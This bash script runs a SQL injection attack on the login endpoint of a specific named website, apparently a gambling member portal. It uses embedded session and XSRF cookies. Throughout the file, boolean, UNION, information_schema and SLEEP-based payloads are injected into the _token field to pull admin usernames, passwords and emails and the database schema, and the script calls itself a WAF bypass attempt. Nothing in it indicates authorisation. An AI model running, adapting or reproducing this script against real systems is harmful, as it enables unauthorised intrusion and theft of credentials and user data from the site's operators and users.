#!/bin/bash

echo "🎯 TARGETED ADMIN EXTRACTION - ZAP ALERT BASED"
echo "================================================"

# Use the provided cookies
XSRF_TOKEN="eyJpdiI6ImU0Y2VHY2t4TEFmR25zMzI2SmlnM0E9PSIsInZhbHVlIjoieDRHSWNFSDhYM0xHb29wMmMwXC9HRmlScWpuOTBwT2ZoeVRsN2tRb0NvZ2ROcWFFc2h5aVJnU0JLWmhUWFRcL2R0IiwibWFjIjoiZjdmYmQxMmFkODFiNmY0MzNlN2I0NWQzYmZmOGE4MzY4MWQ4ZDA5OTQyNGVkMWIwZmM0NTc1ODU2YTZhM2VhMyJ9"
SESSION_TOKEN="eyJpdiI6IlMrRndEZWE0MWNzcU9VUGFaKzJLTlE9PSIsInZhbHVlIjoiYXRZZ081emlyOERHTFkxV0Z2VnNEUGEyQWh2MDRySHR0RzR4dzFGWVZnV3FvblhsMmhKcGw3Zk9PTUpKNXVnVyIsIm1hYyI6IjJkODY2NjViMTNjMzA4OTc4YTZlNmIwNjRkMGFiMGI5MTE3NDVkOGM2NmVkYjY1N2I0NzNhYjg5NmM0NWFiYmMifQ%3D%3D"

LOGIN_URL="https://member.panama8888b.co/auth/login"

echo "🔍 Phase 1: Testing Boolean-based SQL Injection (ZAP Alert Method)"
echo "=================================================================="

# Test the exact payload from ZAP alert
echo "📊 Testing ZAP Alert Payload 1..."
response1=$(curl -s -w "%{http_code}" -o /tmp/response1.txt \
  -X POST "$LOGIN_URL" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -H "X-XSRF-TOKEN: $XSRF_TOKEN" \
  -H "Cookie: XSRF-TOKEN=$XSRF_TOKEN; panama888_session=$SESSION_TOKEN" \
  -d "_token=7kQgPDQ2ky3k4tk7KJIjKp1QvlLjFBdDpZLQ7xBW' AND 1=1--")

http_code1=$(echo "$response1" | tail -n1)
content1=$(cat /tmp/response1.txt)

echo "   HTTP Code: $http_code1"
echo "   Content Length: ${#content1}"
echo "   Content: $content1"

echo ""
echo "📊 Testing ZAP Alert Payload 2..."
response2=$(curl -s -w "%{http_code}" -o /tmp/response2.txt \
  -X POST "$LOGIN_URL" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -H "X-XSRF-TOKEN: $XSRF_TOKEN" \
  -H "Cookie: XSRF-TOKEN=$XSRF_TOKEN; panama888_session=$SESSION_TOKEN" \
  -d "_token=7kQgPDQ2ky3k4tk7KJIjKp1QvlLjFBdDpZLQ7xBW' AND 1=2--")

http_code2=$(echo "$response2" | tail -n1)
content2=$(cat /tmp/response2.txt)

echo "   HTTP Code: $http_code2"
echo "   Content Length: ${#content2}"
echo "   Content: $content2"

echo ""
echo "🔍 Phase 2: Advanced Boolean-based Admin Detection"
echo "=================================================="

# Test for admin users
echo "📊 Testing Admin User Detection..."
admin_test=$(curl -s -w "%{http_code}" -o /tmp/admin_test.txt \
  -X POST "$LOGIN_URL" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -H "X-XSRF-TOKEN: $XSRF_TOKEN" \
  -H "Cookie: XSRF-TOKEN=$XSRF_TOKEN; panama888_session=$SESSION_TOKEN" \
  -d "_token=7kQgPDQ2ky3k4tk7KJIjKp1QvlLjFBdDpZLQ7xBW' AND (SELECT COUNT(*) FROM users WHERE role='admin') > 0--")

http_code_admin=$(echo "$admin_test" | tail -n1)
content_admin=$(cat /tmp/admin_test.txt)

echo "   HTTP Code: $http_code_admin"
echo "   Content Length: ${#content_admin}"
echo "   Content: $content_admin"

echo ""
echo "🔍 Phase 3: Union-based Admin Data Extraction"
echo "============================================="

# Union-based injection to extract admin data
echo "📊 Testing Union-based Admin Extraction..."
union_test=$(curl -s -w "%{http_code}" -o /tmp/union_test.txt \
  -X POST "$LOGIN_URL" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -H "X-XSRF-TOKEN: $XSRF_TOKEN" \
  -H "Cookie: XSRF-TOKEN=$XSRF_TOKEN; panama888_session=$SESSION_TOKEN" \
  -d "_token=7kQgPDQ2ky3k4tk7KJIjKp1QvlLjFBdDpZLQ7xBW' UNION SELECT username,password,email FROM users WHERE role='admin'--")

http_code_union=$(echo "$union_test" | tail -n1)
content_union=$(cat /tmp/union_test.txt)

echo "   HTTP Code: $http_code_union"
echo "   Content Length: ${#content_union}"
echo "   Content: $content_union"

echo ""
echo "🔍 Phase 4: Schema Information Extraction"
echo "========================================="

# Extract database schema
echo "📊 Testing Schema Extraction..."
schema_test=$(curl -s -w "%{http_code}" -o /tmp/schema_test.txt \
  -X POST "$LOGIN_URL" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -H "X-XSRF-TOKEN: $XSRF_TOKEN" \
  -H "Cookie: XSRF-TOKEN=$XSRF_TOKEN; panama888_session=$SESSION_TOKEN" \
  -d "_token=7kQgPDQ2ky3k4tk7KJIjKp1QvlLjFBdDpZLQ7xBW' UNION SELECT table_name,column_name,data_type FROM information_schema.columns WHERE table_schema='public'--")

http_code_schema=$(echo "$schema_test" | tail -n1)
content_schema=$(cat /tmp/schema_test.txt)

echo "   HTTP Code: $http_code_schema"
echo "   Content Length: ${#content_schema}"
echo "   Content: $content_schema"

echo ""
echo "🔍 Phase 5: Time-based Confirmation"
echo "==================================="

# Time-based injection to confirm SQL execution
echo "📊 Testing Time-based Injection..."
time_test=$(curl -s -w "%{time_total}" -o /tmp/time_test.txt \
  -X POST "$LOGIN_URL" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -H "X-XSRF-TOKEN: $XSRF_TOKEN" \
  -H "Cookie: XSRF-TOKEN=$XSRF_TOKEN; panama888_session=$SESSION_TOKEN" \
  -d "_token=7kQgPDQ2ky3k4tk7KJIjKp1QvlLjFBdDpZLQ7xBW' AND (SELECT SLEEP(5) FROM users WHERE role='admin' LIMIT 1)--")

echo "   Response Time: ${time_test}s"

echo ""
echo "🎯 ANALYSIS RESULTS"
echo "=================="

# Compare boolean responses
if [ "${#content1}" != "${#content2}" ]; then
    echo "✅ BOOLEAN-BASED INJECTION SUCCESSFUL!"
    echo "   Different response lengths indicate successful boolean injection"
    echo "   Length with 1=1: ${#content1}"
    echo "   Length with 1=2: ${#content2}"
else
    echo "❌ Boolean-based injection may be blocked by WAF"
fi

# Check for admin detection
if [ "$http_code_admin" = "200" ] && [ "${#content_admin}" -gt 0 ]; then
    echo "✅ ADMIN USER DETECTION SUCCESSFUL!"
    echo "   Response indicates admin users exist in database"
else
    echo "❌ Admin detection may be blocked"
fi

# Check for union injection
if [ "$http_code_union" = "200" ] && [ "${#content_union}" -gt 50 ]; then
    echo "✅ UNION-BASED EXTRACTION SUCCESSFUL!"
    echo "   Large response may contain admin data"
else
    echo "❌ Union-based extraction may be blocked"
fi

# Check for schema extraction
if [ "$http_code_schema" = "200" ] && [ "${#content_schema}" -gt 100 ]; then
    echo "✅ SCHEMA EXTRACTION SUCCESSFUL!"
    echo "   Large response may contain database schema"
else
    echo "❌ Schema extraction may be blocked"
fi

# Check time-based injection
if (( $(echo "$time_test > 4" | bc -l) )); then
    echo "✅ TIME-BASED INJECTION SUCCESSFUL!"
    echo "   Response time: ${time_test}s indicates SQL execution"
else
    echo "❌ Time-based injection may be blocked"
fi

echo ""
echo "📋 SUMMARY"
echo "=========="
echo "Target URL: $LOGIN_URL"
echo "Method: POST with _token parameter"
echo "Technique: Boolean-based, Union-based, Time-based SQL Injection"
echo "Status: WAF bypass attempt using ZAP alert methodology"

# Clean up temp files
rm -f /tmp/response1.txt /tmp/response2.txt /tmp/admin_test.txt /tmp/union_test.txt /tmp/schema_test.txt /tmp/time_test.txt

echo ""
echo "🎯 TARGETED ADMIN EXTRACTION COMPLETED!"